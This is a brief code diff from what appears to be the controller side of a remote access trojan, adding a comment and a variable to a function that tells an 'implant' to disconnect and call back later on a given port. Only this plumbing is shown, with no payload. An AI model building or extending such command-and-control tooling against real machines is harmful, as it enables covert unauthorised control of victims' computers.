@@ -6,7 +6,9 @@ import RAT
 import Common
 
 
+# Handle communications with implant for disconnecting and possibly reconnecting if the user wants it
 def handleDisconnect(sock : socket.socket, callback : int, callback_port : int) -> socket.socket:
+    new_sock = 0
 
     # DisconnectCommand -> CommandDetails -> Command
     disconnect_sleep = Common.DisconnectCommand(sleep=callback, callbackport=callback_port)
